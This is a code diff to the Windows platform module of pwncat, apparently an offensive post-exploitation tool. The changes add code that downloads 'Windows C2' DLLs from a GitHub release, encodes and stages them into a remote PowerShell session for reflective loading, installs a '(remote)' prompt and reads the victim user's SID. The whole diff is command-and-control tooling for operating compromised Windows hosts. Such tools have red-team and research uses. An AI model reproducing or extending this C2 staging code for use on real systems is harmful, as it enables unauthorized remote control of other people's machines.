@@ -8,30 +8,26 @@ import time
 import base64
 import shutil
 import pathlib
+import tarfile
 import termios
 import readline
 import textwrap
 import subprocess
-from io import (
-    BytesIO,
-    StringIO,
-    RawIOBase,
-    TextIOWrapper,
-    BufferedIOBase,
-    UnsupportedOperation,
-)
+from io import (BytesIO, StringIO, RawIOBase, TextIOWrapper, BufferedIOBase,
+                UnsupportedOperation)
 from typing import List, Union, BinaryIO
 from subprocess import TimeoutExpired, CalledProcessError
 from dataclasses import dataclass
 
-import pkg_resources
-
 import pwncat
+import requests
 import pwncat.util
+import pkg_resources
 import pwncat.subprocess
 from pwncat.platform import Path, Platform, PlatformError
 
 INTERACTIVE_END_MARKER = b"\nINTERACTIVE_COMPLETE\r\n"
+PWNCAT_WINDOWS_C2_RELEASE_URL = "https://github.com/calebstewart/pwncat-windows-c2/releases/download/v0.0.1/pwncat-windows-v0.0.1.tar.gz"
 
 
 class PowershellError(Exception):
@@ -122,6 +118,7 @@ class WindowsFile(RawIOBase):
             return 0
 
         self.platform.run_method("File", "read")
+        self.platform.channel.sendline(str(self.handle).encode("utf-8"))
         self.platform.channel.sendline(str(len(b)).encode("utf-8"))
         count = int(self.platform.channel.recvuntil(b"\n").strip())
 
@@ -390,7 +387,23 @@ class Windows(Platform):
         # Tracks paths to modules which have been sideloaded into powershell
         self.psmodules = []
 
+        # Ensure we have the C2 libraries downloaded
+        self._ensure_libs()
+
         self._bootstrap_stage_two()
+
+        # This is a dirty hack
+        old_close = self.channel.close
+
+        def new_close():
+            self.run_method("StageTwo", "exit")
+            old_close()
+
+        self.channel.close = new_close
+
+        self.refresh_uid()
+
+        self.setup_prompt()
 
         # Load requested libraries
         # for library, methods in self.LIBRARY_IMPORTS.items():
@@ -400,6 +413,41 @@ class Windows(Platform):
         """ Run a method reflectively from the loaded StageTwo assembly """
 
         self.channel.send(f"{typ}\n{method}\n".encode("utf-8"))
+
+    def setup_prompt(self):
+        """ Set a prompt method for powershell to ensure our prompt looks pretty :) """
+
+        self.powershell(
+            """
+function prompt {
+  $ESC = [char]27
+  Write-Host "$ESC[31m(remote)$ESC[33m $env:UserName@$env:ComputerName$ESC[0m:$ESC[36m$($executionContext.SessionState.Path.CurrentLocation)$ESC[0m$" -NoNewLine
+  return " "
+}"""
+        )
+
+    def _ensure_libs(self):
+        """This method checks that stageone.dll and stagetwo.dll exist within
+        the directory specified by the windows_c2_dir configuration. If they do
+        not, a release copy is downloaded from GitHub."""
+
+        location = pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
+        location.mkdir(parents=True, exist_ok=True)
+
+        if (
+            not (location / "stageone.dll").exists()
+            or not (location / "stagetwo.dll").exists()
+        ):
+            self.session.manager.log("Downloading Windows C2 binaries from GitHub...")
+            with requests.get(PWNCAT_WINDOWS_C2_RELEASE_URL, stream=True) as request:
+                data = request.raw.read()
+                with tarfile.open(mode="r:gz", fileobj=BytesIO(data)) as tar:
+                    with tar.extractfile("stageone.dll") as stageone:
+                        with (location / "stageone.dll").open("wb") as output:
+                            shutil.copyfileobj(stageone, output)
+                    with tar.extractfile("stagetwo.dll") as stagetwo:
+                        with (location / "stagetwo.dll").open("wb") as output:
+                            shutil.copyfileobj(stagetwo, output)
 
     def _bootstrap_stage_two(self):
         """This takes the stage one C2 (powershell) and boostraps it for stage
@@ -432,11 +480,17 @@ class Windows(Platform):
         chunk_sz = 1900
 
         loader_encoded_name = pwncat.util.random_string()
+        stageone = (
+            pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
+            / "stageone.dll"
+        )
+        stagetwo = (
+            pathlib.Path(self.session.config["windows_c2_dir"]).expanduser()
+            / "stagetwo.dll"
+        )
 
         # Read the loader
-        with open(
-            pkg_resources.resource_filename("pwncat", "data/loader.dll"), "rb"
-        ) as filp:
+        with stageone.open("rb") as filp:
             loader_dll = base64.b64encode(filp.read())
 
         # Extract first chunk
@@ -519,9 +573,7 @@ class Windows(Platform):
         self.channel.recvuntil(b"\n")
 
         # Load, Compress and Encode stage two
-        with open(
-            pkg_resources.resource_filename("pwncat", "data/stagetwo.dll"), "rb"
-        ) as filp:
+        with stagetwo.open("rb") as filp:
             stagetwo_dll = filp.read()
             compressed = BytesIO()
             with gzip.GzipFile(fileobj=compressed, mode="wb") as gz:
@@ -773,6 +825,20 @@ class Windows(Platform):
             return p.stdout.strip()
         except CalledProcessError:
             return None
+
+    def refresh_uid(self):
+        """ Retrieve the current user ID """
+
+        self.powershell(
+            "Add-Type -AssemblyName System.DirectoryServices.AccountManagement"
+        )
+        self.user_info = self.powershell(
+            "([System.DirectoryServices.AccountManagement.UserPrincipal]::Current).SID.Value"
+        )
+
+    def getuid(self):
+
+        return self.user_info
 
     def new_item(self, **kwargs):
         """Run the `New-Item` commandlet with specified arguments and
